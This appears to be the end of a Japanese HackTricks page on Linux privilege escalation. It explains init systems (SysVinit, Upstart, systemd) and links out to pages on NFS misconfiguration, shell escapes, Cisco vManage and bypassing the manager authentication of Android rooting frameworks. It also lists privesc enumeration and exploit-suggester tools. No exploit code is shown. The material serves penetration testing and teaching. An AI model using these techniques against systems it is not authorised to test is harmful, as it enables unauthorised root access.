ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の格納場所です。これは **古典的な Linux のサービス管理システム** で、サービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` があります。

一方、`/etc/init` は **Upstart** に関連し、Ubuntu によって導入された新しい **service management** で、サービス管理のための設定ファイルを使用します。Upstart への移行後も互換レイヤにより SysVinit スクリプトは Upstart 設定と並行して使われ続けます。

**systemd** は現代的な初期化およびサービスマネージャとして登場し、オンデマンドのデーモン起動、自動マウント (automount) 管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ向けに `/usr/lib/systemd/`、管理者の変更用に `/etc/systemd/system/` に整理され、システム管理を効率化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android の rooting frameworks は一般に syscall をフックして特権付きカーネル機能を userspace の manager に公開します。マネージャの認証が弱い（例: FD-order に基づく署名チェックや脆弱なパスワード方式）と、ローカルアプリがマネージャを偽装して既に root 化されたデバイス上で root に昇格できる可能性があります。詳細とエクスプロイトは以下参照:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と macOS のカーネル脆弱性を列挙するツール [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
